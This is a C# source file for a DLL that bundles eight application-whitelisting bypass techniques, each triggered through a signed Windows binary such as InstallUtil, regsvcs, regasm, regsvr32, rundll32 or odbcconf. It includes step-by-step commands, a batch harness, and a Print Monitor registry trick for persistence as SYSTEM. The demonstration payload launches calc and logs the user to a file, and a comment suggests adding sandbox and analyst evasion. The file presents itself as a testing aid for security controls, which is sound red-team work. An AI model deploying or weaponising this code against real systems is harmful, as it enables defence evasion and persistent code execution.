using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices;
using RGiesecke.DllExport;
using System.Windows.Forms;

// You will need Visual Studio and UnmanagedExports to build this binary
// Install-Package UnmanagedExports -Version 1.2.7

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

For Testing Binary Application Whitelisting Controls

Includes 5 Known Application Whitelisting/ Application Control Bypass Techiniques in One File.
1. InstallUtil.exe
2. Regsvcs.exe
3. Regasm.exe
4. regsvr32.exe
5. rundll32.exe
6. odbcconf.exe
7. regsvr32 with params
8. Print Monitor (added by Jabra)

Usage:
1.
    x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
2.
    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
3.
    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

4.
    regsvr32 /s /u AllTheThings.dll -->Calls DllUnregisterServer
    regsvr32 /s AllTheThings.dll --> Calls DllRegisterServer
5.
    rundll32 AllTheThings.dll,EntryPoint

6.
    odbcconf.exe /s /a { REGSVR AllTheThings.dll }

7.
    regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThings.dll

8.  Print Monitor (requires admin privs)

	Install
      
      copy the DLL to C:\Windows\System32\PrintMonitor.dll (or any name.dll in C:\Windows\System32\ is fine too)
       
      reg add HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Tmp2 /V Driver /t REG_SZ /d PrintMonitor.dll
 
      (feel free to change Tmp2 to anything else if you want)

      **Restart the system**
      
      You should now see calc running as SYSTEM. To verify, open a cmd prompt as an administrator and run
      
      tasklist /v |findstr calc
 
    Uninstall
    
      reg delete HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Tmp2 /F
    
Sample Harness.Bat

[Begin]
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
regsvr32 /s /u AllTheThings.dll
regsvr32 /s AllTheThings.dll
rundll32 AllTheThings.dll,EntryPoint
odbcconf.exe /a { REGSVR AllTheThings.dll }
regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThings.dll
[End]


*/

[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        Thing0.Exec();
        //Add any behaviour here to throw off sandbox execution/analysts :)
    }

}

public class Thing0
{
    public static void Exec()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "calc.exe";
        Process.Start(startInfo);
        string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        string localDate = DateTime.Now.ToString("MM/dd/yyyy");
        string localTime = DateTime.Now.ToString("h:mm tt");
        string[] lines = { "T1202", userName, localDate, localTime };
        // WriteAllLines creates a file, writes a collection of strings to the file,
        // and then closes the file.  You do NOT need to call Flush() or Close().
        System.IO.File.WriteAllLines(@"C:\t1202.txt", lines);
    }

    public static void ExecParam(string a)
    {
        MessageBox.Show(a);
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Thing1 : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {

        Console.WriteLine("Hello There From Uninstall");
        Thing0.Exec();

    }

}

[ComVisible(true)]
[Guid("31D2B969-7608-426E-9D8E-A09FC9A51680")]
[ClassInterface(ClassInterfaceType.None)]
[ProgId("dllguest.Bypass")]
[Transaction(TransactionOption.Required)]
public class Bypass : ServicedComponent
{
    public Bypass() { Console.WriteLine("I am a basic COM Object"); }

    [ComRegisterFunction] //This executes if registration is successful
    public static void RegisterClass(string key)
    {
        Console.WriteLine("I shouldn't really execute");
        Thing0.Exec();
    }

    [ComUnregisterFunction] //This executes if registration fails
    public static void UnRegisterClass(string key)
    {
        Console.WriteLine("I shouldn't really execute either.");
        Thing0.Exec();
    }

    public void Exec() { Thing0.Exec(); }
}

///
///
/// Add any exports necessary for DLLs development

class Exports
{

    //
    //
    //rundll32 entry point
        [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
        public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
        {
            Thing0.Exec();
        }
	
    // added by jabra for Print Monitor persistence.
    // -----------------------------------------------
        [DllExport("InitializePrintMonitor2", CallingConvention = CallingConvention.StdCall)] 
        public static bool InitializePrintMonitor2()
        {
            Thing0.Exec();
            return true;
        }
    // -------------------------------------------------

        [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
        public static bool DllRegisterServer()
        {
            Thing0.Exec();
            return true;
        }

        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
        public static bool DllUUnregisterServer()
        {
            Thing0.Exec();
            return true;
        }

    [DllExport("DllInstall", CallingConvention = CallingConvention.StdCall)]
        public static void DllInstall(bool bInstall, IntPtr a)
        {
            string b = Marshal.PtrToStringUni(a);
            Thing0.ExecParam(b);
        }


}
